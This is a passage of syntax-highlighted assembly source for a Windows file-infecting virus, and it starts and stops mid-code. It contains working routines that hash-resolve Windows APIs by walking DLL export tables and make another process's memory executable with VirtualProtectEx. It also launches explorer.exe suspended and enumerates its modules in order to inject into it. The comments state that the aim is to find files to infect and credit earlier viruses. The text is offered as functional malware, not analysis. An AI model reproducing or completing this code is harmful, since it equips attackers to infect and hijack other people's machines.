</span><span class="sc6">mov</span><span class="sc0">  </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
</span><span class="sc6">pop</span><span class="sc0">  </span><span class="sc8">ecx</span><span class="sc0">
</span><span class="sc6">pop</span><span class="sc0">  </span><span class="sc8">esi</span><span class="sc0">
</span><span class="sc6">pop</span><span class="sc0">  </span><span class="sc8">eax</span><span class="sc0">
</span><span class="sc5">NoThisProcess</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
</span><span class="sc5">GezApi</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc5">VirtualProtectExCRC</span><span class="sc4">,</span><span class="sc5">VPNameLen</span><span class="sc0">
</span><span class="sc1">;eax -&gt; VirtualProtectEx</span><span class="sc0">
</span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
</span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">
</span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">
</span><span class="sc1">;ebx = hand of process</span><span class="sc0">
</span><span class="sc1">;esi = dir</span><span class="sc0">
</span><span class="sc1">;ecx = nbytes</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0"> </span><span class="sc1">;space for receiving lpflOldProtect out parameter</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">esp</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc5">PAGE_EXECUTE_READWRITE</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">
</span><span class="sc6">call</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
</span><span class="sc6">pop</span><span class="sc0">  </span><span class="sc8">eax</span><span class="sc0"> </span><span class="sc1">;we remove space that we reserve in the stack for out parameter</span><span class="sc0">
</span><span class="sc6">ret</span><span class="sc0">
</span><span class="sc1">;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;</span><span class="sc0">




</span><span class="sc1">;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;CRC32 rutine(from Billy Belcebu tutorial)...i have not said him nothing about i have take</span><span class="sc0">
</span><span class="sc1">;his rutine but i dont know him...in addition i have seen this rutine in other viruses</span><span class="sc0">
</span><span class="sc1">;so i think he doesnt go angry if i use it :)</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;in:esi -&gt; start of buffer</span><span class="sc0">
</span><span class="sc1">;   edi = size of buffer</span><span class="sc0">
</span><span class="sc1">;out:</span><span class="sc0">
</span><span class="sc1">;   eax = cksum </span><span class="sc0">
</span><span class="sc1">;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;</span><span class="sc0">
</span><span class="sc5">CRC32</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">cld</span><span class="sc0">
      </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc8">ecx</span><span class="sc0">
      </span><span class="sc6">dec</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc8">ecx</span><span class="sc0">
</span><span class="sc5">NextByteCRC</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc8">ebx</span><span class="sc0">
    </span><span class="sc6">lodsb</span><span class="sc0">
      </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc8">cl</span><span class="sc0">                           
      </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cl</span><span class="sc4">,</span><span class="sc8">ch</span><span class="sc0">                           
    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ch</span><span class="sc4">,</span><span class="sc8">dl</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">dl</span><span class="sc4">,</span><span class="sc8">dh</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">dh</span><span class="sc4">,</span><span class="sc2">8</span><span class="sc0">
</span><span class="sc5">NextBitCRC</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">shr</span><span class="sc0">     </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc2">1</span><span class="sc0">
    </span><span class="sc6">rcr</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">1</span><span class="sc0">
    </span><span class="sc6">jnc</span><span class="sc0">     </span><span class="sc5">NoCRC</span><span class="sc0">
    </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">08320h</span><span class="sc0">
    </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc2">0EDB8h</span><span class="sc0">
</span><span class="sc5">NoCRC</span><span class="sc4">:</span><span class="sc0">
      </span><span class="sc6">dec</span><span class="sc0">     </span><span class="sc8">dh</span><span class="sc0">
    </span><span class="sc6">jnz</span><span class="sc0">     </span><span class="sc5">NextBitCRC</span><span class="sc0">
    </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc8">ebx</span><span class="sc0">
      </span><span class="sc6">dec</span><span class="sc0">     </span><span class="sc8">edi</span><span class="sc0">
    </span><span class="sc6">jnz</span><span class="sc0">     </span><span class="sc5">NextByteCRC</span><span class="sc0">
    </span><span class="sc6">not</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc0">
    </span><span class="sc6">not</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">edx</span><span class="sc0">
    </span><span class="sc6">rol</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">16</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">cx</span><span class="sc0">
    </span><span class="sc6">ret</span><span class="sc0">
</span><span class="sc1">;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;</span><span class="sc0">




</span><span class="sc1">;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;GetApi gets a api address from its crc. </span><span class="sc0">
</span><span class="sc1">;in:</span><span class="sc0">
</span><span class="sc1">;   eax -&gt; base of dll</span><span class="sc0">
</span><span class="sc1">;   edx = the crc32 of api to search.</span><span class="sc0">
</span><span class="sc1">;   ebx = api name len.</span><span class="sc0">
</span><span class="sc1">;out:</span><span class="sc0">
</span><span class="sc1">;   eax -&gt; function</span><span class="sc0">
</span><span class="sc1">;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;</span><span class="sc0">
</span><span class="sc5">GetApi</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc1">;eax -&gt; base of dll</span><span class="sc0">
</span><span class="sc1">;ebx = len api name</span><span class="sc0">
</span><span class="sc1">;edx = crc of api name</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">eax</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">3ch</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esp</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc1">;eax -&gt; PE</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">eax</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">78h</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esp</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc1">;eax -&gt; Export table</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0">  </span><span class="sc8">ebx</span><span class="sc4">,[</span><span class="sc8">eax</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">20h</span><span class="sc4">]</span><span class="sc0"> 
</span><span class="sc6">add</span><span class="sc0">  </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">8</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc1">;ebx -&gt; Name of functions</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">
</span><span class="sc6">sub</span><span class="sc0">  </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc2">4</span><span class="sc0">
</span><span class="sc5">SearchApiByCRC</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc6">add</span><span class="sc0">  </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc2">4</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0">  </span><span class="sc8">esi</span><span class="sc4">,[</span><span class="sc8">ebx</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc6">add</span><span class="sc0">  </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">12</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc5">CalcLenString</span><span class="sc0"> 
</span><span class="sc1">;ecx = length api.name</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0">  </span><span class="sc8">edi</span><span class="sc4">,[</span><span class="sc8">esp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">4</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc6">cmp</span><span class="sc0">  </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc8">ecx</span><span class="sc0">
</span><span class="sc6">jne</span><span class="sc0">  </span><span class="sc5">SearchApiByCRC</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0">  </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc8">ecx</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">
</span><span class="sc5">callz</span><span class="sc0"> </span><span class="sc5">CRC32</span><span class="sc0">
</span><span class="sc6">pop</span><span class="sc0">  </span><span class="sc8">edx</span><span class="sc0">
</span><span class="sc6">pop</span><span class="sc0">  </span><span class="sc8">ebx</span><span class="sc0">
</span><span class="sc6">cmp</span><span class="sc0">  </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">edx</span><span class="sc0">
</span><span class="sc6">jne</span><span class="sc0">  </span><span class="sc5">SearchApiByCRC</span><span class="sc0">
</span><span class="sc6">pop</span><span class="sc0">  </span><span class="sc8">edi</span><span class="sc0">
</span><span class="sc1">;edi -&gt; name of functions</span><span class="sc0">
</span><span class="sc1">;ebx -&gt; name of functions + (index of our api * 4)</span><span class="sc0">
</span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc8">edi</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">ebx</span><span class="sc0">
</span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc8">edx</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc2">4</span><span class="sc0">
</span><span class="sc6">div</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">
</span><span class="sc1">;eax = index of our api</span><span class="sc0">
</span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">
</span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">
</span><span class="sc1">;ebx -&gt; export</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,[</span><span class="sc8">ebx</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">24h</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esp</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc1">;ecx -&gt; name ordinals</span><span class="sc0">
</span><span class="sc6">rol</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">1</span><span class="sc0">
</span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,[</span><span class="sc8">ecx</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc6">shr</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc2">10h</span><span class="sc0">
</span><span class="sc6">dec</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
</span><span class="sc1">;ecx = ordinal</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">ebx</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">1ch</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esp</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc1">;eax -&gt; address of functions</span><span class="sc0">
</span><span class="sc6">rol</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc2">2</span><span class="sc0">
</span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">ecx</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">eax</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esp</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc1">;eax = address of function searched</span><span class="sc0">
</span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">
</span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">
</span><span class="sc6">ret</span><span class="sc0">
</span><span class="sc1">;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;</span><span class="sc0">


</span><span class="sc1">;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;LoadExplorer9x creates a new process suspended with explorer.exe in 9x</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;I learned how to use ToolHelp32 and psapi thx to Win32.Dengue so i must say thx to GriYo :)</span><span class="sc0">
</span><span class="sc1">;I havent copied code! ... i have read it and i have learned from it :)</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;in:</span><span class="sc0">
</span><span class="sc1">;   eax = base of kernel</span><span class="sc0">
</span><span class="sc1">;out:</span><span class="sc0">
</span><span class="sc1">;   eax = handle to process</span><span class="sc0">
</span><span class="sc1">;   ebx = process ID</span><span class="sc0">
</span><span class="sc1">;   ecx = offset of primary module(.exe module)</span><span class="sc0">
</span><span class="sc1">;   edx = size of module in bytes</span><span class="sc0">
</span><span class="sc1">;   esi = primary thread handle</span><span class="sc0">
</span><span class="sc1">;   edi = primary thread ID</span><span class="sc0">
</span><span class="sc1">;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;</span><span class="sc0">
</span><span class="sc5">LoadExplorer9x</span><span class="sc4">:</span><span class="sc0">

</span><span class="sc1">;Note that though we create a process</span><span class="sc0">
</span><span class="sc1">;from a module from windows directory we specify to CreateProcess that </span><span class="sc0">
</span><span class="sc1">;working directory is same than calling process,this process,so we can search</span><span class="sc0">
</span><span class="sc1">;here a file to infect it.  </span><span class="sc0">

</span><span class="sc6">push</span><span class="sc0">   </span><span class="sc8">eax</span><span class="sc0"> </span><span class="sc1">;kernel base saved</span><span class="sc0">
</span><span class="sc6">sub</span><span class="sc0">    </span><span class="sc8">esp</span><span class="sc4">,</span><span class="sc2">200</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0">    </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc8">esp</span><span class="sc0"> 
</span><span class="sc5">callz</span><span class="sc0">  </span><span class="sc5">GetExplorer</span><span class="sc0">

</span><span class="sc1">;ecx = number of read bytes</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0">   </span><span class="sc8">ecx</span><span class="sc0"> </span><span class="sc1">;we save it</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">204</span><span class="sc4">]</span><span class="sc1">;eax = base kernel</span><span class="sc0">
</span><span class="sc5">GezApi</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc5">CreateProcessACRC</span><span class="sc4">,</span><span class="sc5">CPNameLen</span><span class="sc0">
</span><span class="sc1">;eax -&gt; CreateProcessA</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,(</span><span class="sc5">STARTUPINFOSIZE</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">PROCESSINFORMATIONSIZE</span><span class="sc4">)/</span><span class="sc2">4</span><span class="sc0">
</span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc8">edx</span><span class="sc0">
</span><span class="sc5">SaveSpace9x</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">
</span><span class="sc6">loop</span><span class="sc0"> </span><span class="sc5">SaveSpace9x</span><span class="sc0">
</span><span class="sc1">;esp -&gt; Process Information structure</span><span class="sc0">
</span><span class="sc1">;esp + PROCESSINFORMATIONSIZE -&gt; startupinfo structure </span><span class="sc0">
</span><span class="sc1">;[esp + STARTUPINFOSIZE + PROCESSINFORMATIONSIZE] = len of name of module</span><span class="sc0">
</span><span class="sc1">;esp + 4 + STARTUPINFOSIZE + PROCESSINFORMATIONSIZE -&gt; name of module</span><span class="sc0">
</span><span class="sc1">;[esp + 204 + STARTUPINFOSIZE + PROCESSINFORMATIONSIZE] = base of kernel</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">PROCESSINFORMATIONSIZE</span><span class="sc4">],</span><span class="sc2">64</span><span class="sc1">;size of startupinfo</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc8">esp</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc1">;process information</span><span class="sc0">
</span><span class="sc6">add</span><span class="sc0">  </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc5">PROCESSINFORMATIONSIZE</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc1">;startupinfo</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc5">CREATE_SUSPENDED</span><span class="sc0"> </span><span class="sc6">or</span><span class="sc0"> </span><span class="sc5">CREATE_NEW_PROCESS_GROUP</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc6">add</span><span class="sc0">  </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc2">4</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">STARTUPINFOSIZE</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc1">;name of module</span><span class="sc0">
</span><span class="sc6">call</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc1">;CreateProcessA</span><span class="sc0">
</span><span class="sc1">;we have created the suspended process</span><span class="sc0">
</span><span class="sc1">;[esp] = handle to new process</span><span class="sc0">
</span><span class="sc1">;[esp + 4]  = handle to primary thread(suspended)</span><span class="sc0">
</span><span class="sc1">;[esp + 8]  = Id of process</span><span class="sc0">
</span><span class="sc1">;[esp + 12] = Id of thread</span><span class="sc0">
</span><span class="sc1">;now i must search the primary module of the process.</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">esp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">204</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">STARTUPINFOSIZE</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">PROCESSINFORMATIONSIZE</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc1">;eax = base of kernel</span><span class="sc0">
</span><span class="sc5">GezApi</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc5">CreateToolhelp32SnapShotCRC</span><span class="sc4">,</span><span class="sc5">CT32SNameLen</span><span class="sc0">
</span><span class="sc1">;eax -&gt; CreateToolhelp32Snapshot</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,[</span><span class="sc8">esp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">8</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc1">;ebx = handle to process</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc5">TH32CS_SNAPMODULE</span><span class="sc0">
</span><span class="sc6">call</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
</span><span class="sc1">;eax = snapshot</span><span class="sc0">
</span><span class="sc1">;we have create the snapshot and now we will search the module that we need.</span><span class="sc0">
</span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">esp</span><span class="sc4">,</span><span class="sc2">548</span><span class="sc0">
</span><span class="sc1">;we will reserve space for MODULEENTRY32</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc4">[</span><span class="sc8">esp</span><span class="sc4">],</span><span class="sc2">548</span><span class="sc0"> </span><span class="sc1">;sizeof MODULEENTRY32</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
</span><span class="sc1">;ecx = snapshot</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">548</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">PROCESSINFORMATIONSIZE</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">SNAPSHOT</span><span class="sc4">],</span><span class="sc8">ecx</span><span class="sc1">;we save it</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">esp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">548</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">4</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">200</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">STARTUPINFOSIZE</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">PROCESSINFORMATIONSIZE</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc1">;eax = base of kernel</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
</span><span class="sc5">GezApi</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc5">Module32FirstCRC</span><span class="sc4">,</span><span class="sc5">M32FNameLen</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0">  </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc8">esp</span><span class="sc0">
</span><span class="sc6">add</span><span class="sc0">  </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc2">4</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
</span><span class="sc6">call</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
